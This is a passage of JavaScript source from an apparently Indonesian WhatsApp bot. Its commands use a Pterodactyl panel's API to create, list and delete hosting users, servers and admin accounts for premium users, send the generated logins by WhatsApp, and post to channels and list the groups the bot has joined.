    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "1048";
    let cpu = "70"; 
    let disk = "3048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 1GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}


case '2gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "2048";
    let cpu = "75"; 
    let disk = "3048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 2GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}




case '3gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "3048";
    let cpu = "80"; 
    let disk = "3048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 3GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}


case '4gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "4048";
    let cpu = "90"; 
    let disk = "4048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 4GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}



case '5gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "5048";
    let cpu = "100"; 
    let disk = "5048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 5GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}

case '6gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "6048";
    let cpu = "120"; 
    let disk = "6048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 6GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}


case '7gb': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "7048";
    let cpu = "130"; 
    let disk = "7048";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server 7GB - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}


case 'unli': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net';
    let name = username;
    let egg = `${eggnya}`;
    let loc = `${locnya}`;
    let memo = "0";
    let cpu = "0"; 
    let disk = "0";
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');
    let deskripsi = `Server unli - Aktif 1 Bulan`;

    try {
    
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

       
        let eggRes = await fetch(`${domain}/api/application/nests/5/eggs/${egg}`, {
            method: "GET",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            }
        });
        let eggData = await eggRes.json();
        let startupCmd = eggData.attributes.startup;

        let serverRes = await fetch(`${domain}/api/application/servers`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                name,
                description: deskripsi,
                user: user.id,
                egg: parseInt(egg),
                docker_image: "ghcr.io/parkervcp/yolks:nodejs_18",
                startup: startupCmd,
                environment: {
                    "INST": "npm",
                    "USER_UPLOAD": "0",
                    "AUTO_UPDATE": "0",
                    "CMD_RUN": "npm start"
                },
                limits: {
                    memory: memo,
                    swap: 0,
                    disk: disk, 
                    io: 500,
                    cpu: cpu
                },
                feature_limits: {
                    databases: 0,
                    backups: 0,
                    allocations: 0
                },
                deploy: {
                    locations: [parseInt(loc)],
                    dedicated_ip: false,
                    port_range: []
                }
            })
        });
        let serverData = await serverRes.json();
        if (serverData.errors) return m.reply(JSON.stringify(serverData.errors[0], null, 2));
        let server = serverData.attributes;

       
        let panelData = `*DATA PANEL ANDA*\n\n` +
            `👤 Username: ${user.username}\n` +
            `🔐 Password: ${password}\n` +
            `🌐 URL: ${domain}\n` +
            `📋 Deskripsi: ${deskripsi}\n\n` +
            `*Simpan data ini dengan baik!*\n`;

        
        await dy.sendMessage(u, { text: panelData }, { quoted: fverif });

        m.reply(`Sukses membuat akun dan server:\n\n👤 ID User: ${user.id}\n🖥️ ID Server: ${server.id}\n💾 RAM: ${memo} MB\n📂 Disk: ${disk} MB\n🔧 CPU: ${cpu}%\n\nData panel telah dikirim ke nomor ${inputNumber}.`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
    break;
}






case 'listadmin': {
if (!isCreator) return m.reply(mess.owner)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/users?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}});
let res = await f.json();
let users = res.data;
let messageText = "Berikut List Admin:\n\n";
for (let user of users) {
let u = user.attributes;
if (u.root_admin) {
messageText += `ID: ${u.id} - Status: ${u.attributes?.user?.server_limit === null ? 'Inactive' : 'Active'}\n`;
messageText += `${u.username}\n`;
messageText += `${u.first_name} ${u.last_name}\n\n`;
}}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total: ${res.meta.pagination.count}`;
await dy.sendMessage(m.chat, { text: messageText }, { quoted: fverif });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break
case 'createadmin': case 'adp': {
    if (!isPremium) return m.reply(mess.premium);
    let t = text.split(',');
    if (t.length < 2) return m.reply(`Contoh: ${prefix + command} username,nomor`);

   
    let username = t[0].trim();
    let inputNumber = t[1].replace(/[^0-9]/g, '');
    let u = inputNumber + '@s.whatsapp.net'; 
    let email = username + "@dycoders.xyz";
    let password = crypto.randomBytes(5).toString('hex');

 
    if (m.key.remoteJid.endsWith('@g.us')) {
        return m.reply("Perintah ini hanya bisa digunakan di chat pribadi.");
    }

    try {
        
        let userRes = await fetch(`${domain}/api/application/users`, {
            method: "POST",
            headers: {
                "Accept": "application/json",
                "Content-Type": "application/json",
                "Authorization": `Bearer ${apikey}`
            },
            body: JSON.stringify({
                email,
                username,
                first_name: username,
                last_name: username,
                language: "en",
                password,
                root_admin: true 
            })
        });
        let userData = await userRes.json();
        if (userData.errors) return m.reply(JSON.stringify(userData.errors[0], null, 2));
        let user = userData.attributes;

    
        let adminData = `*DATA ADMIN ANDA*\n\n` +
                        `👤 Username: ${user.username}\n` +
                        `🔐 Password: ${password}\n` +
                        `🌐 URL: ${domain}\n` +
                        `📋 Role: Admin\n\n` +
                        `*Simpan data ini dengan baik!*\n`;

     
        await dy.sendMessage(u, { text: adminData }, { quoted: fverif });


        m.reply(`Sukses membuat akun admin dan mengirimkan data ke nomor: ${inputNumber}`);
    } catch (error) {
        console.error(error);
        m.reply("Terjadi kesalahan saat memproses data. Cek kembali konfigurasi dan input Anda.");
    }
}
break;  

case 'listsrv': {
if (!isPremium) return m.reply(mess.premium)
let page = args[0] ? args[0] : '1';
let f = await fetch(domain + "/api/application/servers?page=" + page, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
});
let res = await f.json();
let servers = res.data;
let sections = [];
let messageText = "Berikut list server nya:\n\n";
for (let server of servers) {
let s = server.attributes; 
let f3 = await fetch(domain + "/api/client/servers/" + s.uuid.split`-`[0] + "/resources", {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + capikey
}
});
let data = await f3.json();
let status = data.attributes ? data.attributes.current_state : s.status;
messageText += `ID server: ${s.id}\n`;
messageText += `Nama server: ${s.name}\n`;
messageText += `Status: ${status}\n\n`;
}
messageText += `Halaman: ${res.meta.pagination.current_page}/${res.meta.pagination.total_pages}\n`;
messageText += `Total server: ${res.meta.pagination.count}`;
await dy.sendMessage(m.chat, { text: messageText }, { quoted: fverif });
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
m.reply(`Contoh: ${prefix+command} ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya`);
}
}
break



case 'delsrv': {
    if (!isPremium) return m.reply(mess.premium);
    
    let srvList = args[0];
    if (!srvList) return m.reply('ID servernya mana? Contoh: delsrv 1,2,3');
    
    let ids = srvList.split(',').map(id => id.trim());
    if (ids.length === 0) return m.reply('Tidak ada ID server yang valid.');
    
    let failed = [];
    let success = [];
    
    for (let srv of ids) {
        try {
            let f = await fetch(domain + "/api/application/servers/" + srv, {
                "method": "DELETE",
                "headers": {
                    "Accept": "application/json",
                    "Content-Type": "application/json",
                    "Authorization": "Bearer " + apikey,
                }
            });
            
            if (f.ok) {
                success.push(srv);
            } else {
                let res = await f.json();
                if (res.errors) failed.push(srv);
            }
        } catch (error) {
            failed.push(srv);
        }
    }
    
    let message = '*Hasil Penghapusan Server:*\n\n';
    if (success.length > 0) message += `✅ Berhasil dihapus: ${success.join(', ')}\n`;
    if (failed.length > 0) message += `❌ Gagal dihapus: ${failed.join(', ')}\n`;
    
    m.reply(message);
}
break;


case 'delusr': {
if (!isCreator) return m.reply(mess.owner)
let usr = args[0]
if (!usr) return m.reply('ID nya mana?')
let f = await fetch(domain + "/api/application/users/" + usr, {
"method": "DELETE",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + apikey
}
})
let res = f.ok ? {
errors: null
} : await f.json()
if (res.errors) return m.reply('User tidak ditemukan!')
m.reply('Sukses menghapus user!')
}
break

case 'cekidchannel': {
  
    

    try {
        
        let channelId = m.key.remoteJid;

       
        m.reply(`*ID Channel WhatsApp Ditemukan*\n\n📋 ID: ${channelId}\n🔗 Format: wa.me/${channelId.replace('@broadcast', '')}`);
    } catch (error) {
        console.error(error);
        m.reply('f');
    }
}
break;
case 'kirimpesanchannel': {
if (!isCreator) return reply(mess.owner)
    if (!text) return reply(`*Example*: ${prefix + command} 120363303267333730@newsletter | Halo semua!`);

    try {
      
        const [channelId, ...messageParts] = text.split('|');
        const formattedChannelId = channelId.trim();
        const messageToSend = messageParts.join('|').trim();

      
        if (!formattedChannelId.endsWith('@newsletter')) {
            return reply('❌ Format ID channel salah! ID harus diakhiri dengan "@newsletter".');
        }

        
        await dy.sendMessage(formattedChannelId, { text: messageToSend });

        reply(`✅ Pesan berhasil dikirim ke channel:\n📋 ID: ${formattedChannelId}\n📝 Pesan: ${messageToSend}`);
    } catch (error) {
        console.error(error);
        reply('❌ Terjadi kesalahan saat mengirim pesan ke channel.');
    }
}
break;

case 'cekidgc': {
  if (!isCreator) return reply(mess.owner)
    try {
     
        const allGroups = await dy.groupFetchAllParticipating();
        if (!allGroups || allGroups.length === 0) {
            return m.reply('❌ Bot tidak bergabung dalam grup manapun!');
        }

  
        let groupList = Object.values(allGroups).map((group, index) => {
            return `*${index + 1}.* 📋 *Grup name:* ${group.subject}\n*ID Grup:* ${group.id}\n🔗 Format: wa.me/${group.id.replace('@g.us', '')}`;
        }).join('\n\n');

        m.reply(`*Daftar ID Grup WhatsApp yang Diikuti:*\n\n${groupList}`);
    } catch (error) {
